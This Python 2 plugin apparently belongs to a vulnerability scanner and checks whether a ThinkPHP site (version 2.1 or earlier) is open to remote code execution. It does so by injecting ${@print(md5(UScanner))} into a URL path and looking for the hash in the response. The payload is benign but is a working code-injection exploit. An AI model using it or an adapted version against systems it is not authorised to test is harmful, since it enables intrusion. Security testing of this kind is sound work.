# -*- coding: utf-8 -*-
import urllib2
from lib.core.uspocbase import *

class USPlugin(USPocBase):
    def __init__(self, dict_args = {}):
        super(self.__class__, self).__init__()
        self.info = {
            "name" : 'ThinkPHP远程命令执行漏洞',                        #插件名称
            "author" : '系统',                               #作者名称
            "product" : 'ThinkPHP',                            #存在漏洞的产品
            "product_version" : '<=2.1',                        #存在漏洞的版本号
            "ref" : ['http://www.cnblogs.com/gaoxu387/archive/2012/04/23/2466133.html'],               #引用的URL
            "official_link" : 'http://www.thinkphp.cn/',      #产品官网链接
            "type" : USType.app,                             #插件类型
            "category" : USCategory.rce,                #漏洞类型
            "level" : USLevel.high,                         #漏洞级别
            "create_date" : '2016-09-04',                     #插件创建时间
            "description" : '''
            ThinkPHP存在远程命令执行漏洞，可远程执行任意代码。
            ''',                                              #插件描述
            "require_libs" : []                  #插件需要的第三方模块
        }

        self.register_params({                                #插件所需的参数
            USParams.app.str_appname : "",
            USParams.app.str_url : ""
        }, dict_args)

        self.register_result({                                #插件返回的数据
            USLevel.high : {
                USResult.data : {
                    "user" : "",
                    "pass" : ""
                },
                USResult.desc : ""
            }
        })

    #验证函数，系统根据返回结果来确定是否调用该插件
    def assign(self):
        if self.params[USParams.app.str_appname] == "thinkphp":
            return True
        return False

    #漏洞利用函数
    def run(self):
        res_data = {}
        url = self.params[USParams.app.str_url]
        try:
            f = urllib2.urlopen(url=url+"/index.php/module/action/param1/$%7B@print(md5(UScanner))%7D")
            data = f.read()
            if data.find("7c82343eb5cc76fa2749a906537a39f5") > -1:
                res_data['url'] = url
                self.append_result(USLevel.high, 'URL[%s]存在ThinkPHP命令执行漏洞。'%url, res_data)
        except:
            pass
        return self.results

if __name__ == "__main__":
    usplugin = USPlugin({USParams.app.str_url:"http://localhost/tp/Examples/Url/", USParams.app.str_appname: "thinkphp"})
    if usplugin.assign() == True:
        print usplugin.run()